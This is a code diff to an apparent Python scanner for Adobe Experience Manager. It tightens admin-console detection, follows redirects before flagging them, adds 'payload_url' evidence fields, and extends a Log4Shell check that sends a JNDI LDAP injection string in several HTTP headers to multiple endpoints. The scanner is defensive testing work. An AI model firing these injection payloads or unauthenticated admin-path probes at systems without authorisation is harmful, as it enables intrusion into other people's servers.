@@ -133,8 +133,11 @@ def looks_like_aem_admin(text):
         'crx package manager',
         'groovy console',
         'aem start',
-        'sites',
-        'assets',
+        'sites.html/content',
+        'assets.html/content',
+        'coral-shell',
+        'granite/ui',
+        'aem-authoring',
     ])
 
 
@@ -1073,6 +1076,7 @@ async def check_sensitive_paths(target_url):
     async def probe(client, path):
         try:
             r = await client.get(f"{target_url}{path}", timeout=5)
+            # ── Direct 200 with AEM content ───────────────────────────────
             if r.status_code == 200:
                 if looks_like_aem_admin(r.text):
                     return path
@@ -1082,12 +1086,23 @@ async def check_sensitive_paths(target_url):
                     or "querybuilder" in r.text.lower()
                 ):
                     return path
+            # ── Follow redirects and verify the FINAL destination ─────────
+            # A bare 301/302 is not proof — Cloudflare/Dispatcher often
+            # strips .html or adds trailing slashes.  We must confirm the
+            # final page is actually AEM admin content, not a 404 soft page.
             if r.status_code in (301, 302):
                 loc = r.headers.get("location", "")
                 if any(marker in loc.lower() for marker in [
                     "crx", "system/console", "groovyconsole", "aem/start", "sites.html", "assets.html"
                 ]):
-                    return path
+                    # Follow the redirect chain and check the final response
+                    try:
+                        follow_url = loc if loc.startswith("http") else f"{target_url}{loc}"
+                        r2 = await client.get(follow_url, timeout=5, follow_redirects=True)
+                        if r2.status_code == 200 and looks_like_aem_admin(r2.text):
+                            return path
+                    except Exception:
+                        pass
         except Exception:
             pass
         return None
@@ -1105,10 +1120,12 @@ async def check_sensitive_paths(target_url):
 
     vulns = []
     if critical:
+        payload_urls = [f"{target_url}{p}" for p in critical]
         vulns.append({
             "status": "VULNERABLE",
             "vulnerability": "AEM Critical Admin Console Exposed",
             "target": target_url,
+            "payload_url": " | ".join(payload_urls),
             "details": (
                 f"HIGH-RISK admin consoles accessible without authentication: "
                 f"{', '.join(critical)}. "
@@ -1119,10 +1136,12 @@ async def check_sensitive_paths(target_url):
     non_crit = [p for p in accessible if p not in critical]
     if non_crit:
         extra = "..." if len(non_crit) > 8 else ""
+        payload_urls = [f"{target_url}{p}" for p in non_crit[:8]]
         vulns.append({
             "status": "VULNERABLE",
             "vulnerability": "AEM Sensitive Paths Exposed",
             "target": target_url,
+            "payload_url": " | ".join(payload_urls),
             "details": (
                 f"{len(non_crit)} sensitive path(s) accessible without authentication: "
                 f"{', '.join(non_crit[:8])}{extra}"
@@ -1157,10 +1176,12 @@ async def check_dispatcher_bypass(target_url):
 
     if bypassed:
         extra = "..." if len(bypassed) > 5 else ""
+        payload_urls = [f"{target_url}{p}" for p in bypassed[:5]]
         return {
             "status": "VULNERABLE",
             "vulnerability": "AEM Dispatcher Filter Bypass",
             "target": target_url,
+            "payload_url": " | ".join(payload_urls),
             "details": (
                 f"Dispatcher security filters bypassed via {len(bypassed)} path(s): "
                 f"{', '.join(bypassed[:5])}{extra}. "
@@ -1308,30 +1329,82 @@ async def check_csrf_token_exposure(target_url):
         pass
     return vulns
 
-async def check_log4shell(target_url):
+async def check_log4shell(target_url, version_info=None):
     """
     Probe for Log4Shell (CVE-2021-44228).
-    Requires manual OAST verification.
+    Only fires when version is unknown or in the affected range (AEM 6.5 <= 6.5.10).
+    Cannot confirm without an OAST/callback server — reports as POTENTIAL only.
     """
+    # ── Version gate: skip if we know the version is patched ─────────────
+    if version_info:
+        track = version_info.get('track', '')
+        ver = version_info.get('number')
+        # Cloud Service is not affected
+        if track == 'cloud-service':
+            return []
+        # 6.5 LTS is already patched for Log4Shell
+        if track == '6.5-lts':
+            return []
+        # If we have a version number, check if it's > 6.5.10 (patched)
+        if ver and ver.startswith('6.5.'):
+            if compare_versions(ver, '6.5.10') > 0:
+                return []
+
     vulns = []
-    url = f"{target_url}/"
-    headers = {
-        "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}",
-        "X-Forwarded-For": "${jndi:ldap://127.0.0.1:1389/a}",
-        "Referer": "${jndi:ldap://127.0.0.1:1389/a}",
+    jndi_payload = "${jndi:ldap://127.0.0.1:1389/a}"
+    injection_headers = {
+        "User-Agent": jndi_payload,
+        "X-Forwarded-For": jndi_payload,
+        "Referer": jndi_payload,
+        "X-Api-Version": jndi_payload,
+        "Accept-Language": jndi_payload,
     }
+    # Test multiple endpoints — Log4j may log different paths differently
+    test_paths = [
+        "/",
+        "/content.json",
+        "/libs/granite/core/content/login.html",
+        "/bin/querybuilder.json",
+    ]
+
+    tested_urls = []
     try:
         async with httpx.AsyncClient(verify=False, timeout=6) as client:
-            r = await client.get(url, headers=headers, timeout=5)
-            # Cannot confirm without OAST, but we will add a potential finding
-            vulns.append({
-                "status": "POTENTIAL",
-                "vulnerability": "Log4Shell (CVE-2021-44228) Check",
-                "target": url,
-                "details": "Log4Shell payload sent in headers. Verify manually with an OAST/callback server if affected (AEM 6.5 <= 6.5.10).",
-            })
+            for path in test_paths:
+                test_url = f"{target_url}{path}"
+                try:
+                    r = await client.get(test_url, headers=injection_headers, timeout=5)
+                    tested_urls.append(test_url)
+                except Exception:
+                    continue
     except Exception:
         pass
+
+    if tested_urls:
+        ver_label = ""
+        if version_info:
+            ver = version_info.get('number')
+            if ver:
+                ver_label = f" Detected version: {ver}."
+            else:
+                ver_label = " Version could not be determined."
+        else:
+            ver_label = " Version could not be determined."
+
+        header_list = ", ".join(injection_headers.keys())
+        vulns.append({
+            "status": "POTENTIAL",
+            "vulnerability": "Log4Shell (CVE-2021-44228) Check",
+            "target": target_url,
+            "payload_url": " | ".join(tested_urls),
+            "details": (
+                f"JNDI injection payloads sent in HTTP headers ({header_list}) to "
+                f"{len(tested_urls)} endpoint(s).{ver_label} "
+                "This check requires an out-of-band (OAST) callback server to confirm exploitation. "
+                "AEM 6.5 through 6.5.10 are known to be affected. "
+                "Replace the placeholder JNDI URL with your Burp Collaborator / Interactsh / canarytokens callback to verify."
+            ),
+        })
     return vulns
 
 async def check_sling_model_exporter(target_url):
@@ -1561,6 +1634,14 @@ async def check_jcr_exposure(target_url, extra_probe_urls=None):
         pass
 
     if exposed_paths:
+        # Build full payload URLs for each exposed path
+        jcr_payload_urls = []
+        for p, _, _ in exposed_paths[:6]:
+            if is_full_url(p):
+                jcr_payload_urls.append(p)
+            else:
+                jcr_payload_urls.append(f"{target_url}{p}")
+
         # Group into one finding — list paths and the JCR keys that proved it
         path_summary = ', '.join(
             f"{p} ({', '.join(keys)})" for p, keys, _ in exposed_paths[:6]
@@ -1570,6 +1651,7 @@ async def check_jcr_exposure(target_url, extra_probe_urls=None):
             "status": "VULNERABLE",
             "vulnerability": "AEM JCR Node Data Exposure — Unauthenticated Content Servlet",
             "target": target_url,
+            "payload_url": " | ".join(jcr_payload_urls),
             "details": (
                 f"AEM JCR repository content is served unauthenticated via Sling GET servlet "
                 f"or a custom BFF/headless proxy. {len(exposed_paths)} path(s) leaked raw JCR "
@@ -1589,10 +1671,14 @@ async def check_jcr_exposure(target_url, extra_probe_urls=None):
             if any(kw in p for kw in ['config', 'feature', 'flag', 'secret', 'logging', 'storefront', 'app-'])
         ]
         if config_hits:
+            config_payload_urls = [
+                p if is_full_url(p) else f"{target_url}{p}" for p in config_hits
+            ]
             vulns.append({
                 "status": "VULNERABLE",
                 "vulnerability": "AEM Internal Application Config Exposed via JCR",
                 "target": target_url,
+                "payload_url": " | ".join(config_payload_urls),
                 "details": (
                     f"Application configuration nodes are stored in AEM JCR and served "
                     f"unauthenticated: {', '.join(config_hits)}. "
@@ -1605,10 +1691,14 @@ async def check_jcr_exposure(target_url, extra_probe_urls=None):
         if pii_hits:
             summary = ', '.join(f"{path} ({', '.join(keys)})" for path, keys in pii_hits[:5])
             extra = f" (+ {len(pii_hits) - 5} more)" if len(pii_hits) > 5 else ""
+            pii_payload_urls = [
+                path if is_full_url(path) else f"{target_url}{path}" for path, _ in pii_hits[:5]
+            ]
             vulns.append({
                 "status": "VULNERABLE",
                 "vulnerability": "AEM Anonymous Permission Hardening Gap",
                 "target": target_url,
+                "payload_url": " | ".join(pii_payload_urls),
                 "details": (
                     "Anonymous JSON exposure includes authoring or identity-related metadata that the Adobe "
                     "Anonymous Permission Hardening Package is intended to reduce. "
@@ -2011,7 +2101,7 @@ async def run_scans(target_obj, port):
         check_static_asset_fingerprint(target_url),
         check_replication_agent_credentials(target_url),
         check_csrf_token_exposure(target_url),
-        check_log4shell(target_url),
+        check_log4shell(target_url, version_info),
         check_sling_model_exporter(target_url),
         check_osgi_bundle_install(target_url),
         return_exceptions=True,
@@ -2028,6 +2118,13 @@ async def run_scans(target_obj, port):
                 actual_url = res.get('url') or res.get('target')
                 if actual_url == target_url:
                     actual_url = display_target
+
+                # Auto-populate payload_url: if the check returned a specific URL
+                # as 'target' (different from the base origin) and didn't set payload_url,
+                # use that original target as the payload_url.
+                original_target = res.get('target', '')
+                if 'payload_url' not in res and original_target and original_target != target_url:
+                    res['payload_url'] = original_target
 
                 res.update({
                     'module': 'AEM',
@@ -2055,10 +2152,17 @@ async def run_scans(target_obj, port):
         })
 
     async def enrich_vuln(vuln):
-        vuln_url = vuln.get('url') or vuln.get('target', target_url)
+        # Use the first payload_url (the actual confirming evidence URL)
+        # instead of the base domain URL for enrichment.
+        payload = vuln.get('payload_url', '')
+        if payload and payload != 'N/A':
+            # payload_url may be pipe-delimited — use the first one
+            enrich_url = payload.split(' | ')[0].strip()
+        else:
+            enrich_url = vuln.get('url') or vuln.get('target', target_url)
         try:
-            async with httpx.AsyncClient(verify=False, timeout=5) as client:
-                r = await client.get(vuln_url, timeout=3)
+            async with httpx.AsyncClient(verify=False, timeout=5, follow_redirects=True) as client:
+                r = await client.get(enrich_url, timeout=3)
                 vuln['http_status'] = r.status_code
                 vuln['content_length'] = len(r.content)
                 title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
